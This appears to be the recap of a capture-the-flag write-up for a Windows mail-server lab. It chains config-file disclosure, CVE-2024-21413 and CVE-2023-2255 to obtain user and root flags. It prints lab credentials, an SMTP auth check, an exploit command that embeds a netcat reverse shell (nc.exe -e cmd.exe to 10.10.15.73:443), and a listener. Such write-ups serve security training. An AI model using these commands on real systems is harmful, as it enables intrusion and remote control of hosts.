#### Recap
The download endpoint disclosed the hMailServer configuration file. A weak administrator password hash was recoverable, and an SMTP authentication check confirmed the corresponding mailbox account.
```bash
swaks --auth-user 'administrator@mailing.htb' --auth LOGIN --auth-password 'homenetworkingadministrator' --quit-after AUTH --server mailing.htb
```
A PDF on the site pointed to the mail-client configuration. The lab's CVE-2024-21413 path exposed Maya's authentication material, and the recovered password provided WinRM access and the user flag.

The host ran a version of LibreOffice affected by CVE-2023-2255. A writable share exposed a path for a document to be processed in a privileged context.
```bash
python3 CVE-2023-2255.py --cmd 'cmd.exe /c C:\Users\maya\Documents\nc.exe -e cmd.exe 10.10.15.73 443' --output 'exploit.odt'

smbclient '//IP/Important Documents' -U 'maya%m4y4ngs4ri'
put exploit.odt

rlwrap -cAr nc -lnvp 443
```
The document-processing path produced a shell as localadmin and exposed the root flag.

Key Concepts:
1. CVE-2024-21413 can expose outbound NTLM authentication material.
2. CVE-2023-2255 can allow document content to load external resources without the expected prompt.
3. Distinguish arbitrary file disclosure through file_get_contents() from PHP evaluation through include().
4. hMailServer logs are sensitive because they may contain server activity and attacker-controlled content.
